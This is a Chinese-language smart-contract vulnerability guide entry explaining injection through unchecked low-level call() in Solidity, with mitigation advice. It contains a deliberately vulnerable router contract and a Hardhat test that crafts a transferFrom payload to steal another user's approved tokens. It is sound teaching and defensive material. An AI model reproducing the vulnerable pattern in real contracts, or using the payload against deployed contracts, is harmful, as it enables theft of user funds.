[后退](../../README_CN.md)
# 注入攻击

**漏洞名称：注入攻击**  (Injection Attack)

**风险等级：** 高 

**漏洞描述：**

在以太坊中，合约之间的调用其实是调用的三个底层函数`call`,`delegatecall`和`staticcall`。而合约间相互调用除了能使用比较高级的`合约 + 函数`的模式外，还可以直接使用上面三种比较低级的调用模式，也就是`<address>.call(payload)`。

在采用较低级的底层调用时，通常来讲调用地址和调用数据`payload`都是由合约编写者限定好的，不能由用户输入。但当开发者经验不足时，很可能采用外部函数传参的方法由用户来确定对外调用的地址和调用负载(payload)中的一个，有时甚至这两个参数都由用户输入。此时，如果用户恶意构造一个调用负载或者调用一个作恶地址的话，后果是无法控制的。



我们举一个很简单的例子：

**示例代码语言：** Solidity

**漏洞示例代码：**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract InjectionDemo {
    function swap(address target, bytes calldata payload) external {
        (bool success,) = target.call(payload);
        require(success, "failed");
        // other operation
    }
}
```



**示例代码简介：**

在上例中，假定`InjectionDemo`充当了一个路由功能，它的`swap`函数允许用户自由的调用多个外部Dapp进行操作，例如进行代币兑换。此时，用户必定先要进行授权。

假定用户A对`InjectionDemo`合约进行了代币`AAA`的授权，那么用户B在调用合约的`swap`函数时，就可以精心构造相关交易数据，例如将调用地址设置为`AAA`代币的地址，将`payload`设置为转移用户A代币（`transferFrom`）的拼装数据。此时，在`swap`函数内部会调用相应代币的`transferFrom`函数，可以将以前授权过`InjectionDemo`合约的代币全部转走。



**单元测试代码：**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("InjectionDemo Test", function () {
    let instance;
    let erc20;
    let owner,user1;

    beforeEach( async function() {
        let InjectionDemo = await ethers.getContractFactory("InjectionDemo");
        instance = await InjectionDemo.deploy();
        
        let MockERC20 = await ethers.getContractFactory("MockERC20");
        erc20 = await MockERC20.deploy("AAA","AAA",5000);
         
        [owner,user1,] = await ethers.getSigners();
    });
    
    describe('Injection attack test', () => { 
        it("Exploiter can steal user's token while user approve the InjectionDemo contract", async () => {
            // check balance
            expect(await erc20.balanceOf(user1.address)).to.be.equal(0);
            expect(await erc20.balanceOf(owner.address)).to.be.equal(5000);
            // approve 
            await erc20.approve(instance.address,1000);
            // user1 attack
            let allow = await erc20.allowance(owner.address,instance.address);
            expect(allow).to.be.equal(1000);
            let payload = erc20.interface.encodeFunctionData("transferFrom",[owner.address,user1.address,1000]);
            await instance.connect(user1).swap(erc20.address,payload);
            // check balance again
            expect(await erc20.balanceOf(user1.address)).to.be.equal(1000);
            expect(await erc20.balanceOf(owner.address)).to.be.equal(4000);
        });
    });
});
```



通过上面的单元测试代码我们可以看到，`user1`偷走了`owner`授权`InjectionDemo`合约额度的代币。



**真实案例：**

某跨链桥合约发生过类似案例，用户精心构造`payload`后盗走了授权用户的资金。



**相关建议：**

1. 不使用底层调用`call,delegatecall,staticcall`。除非你真的知道你在做什么，并且没有其它办法可以实现。
2. 进行类似的底层调用时，必须检查相应的地址和调用参数是否由用户输入，用户最多只能输入地址或者调用参数中的一个，不能两个同时输入。
3. 当存在用户输入的情况时，必须对调用的地址或者调用的参数进行限制，必要时排除相关地址或者相关函数选择。
4. 当存在用户输入情况时，必须对调用前后的合约状态进行有效验证。
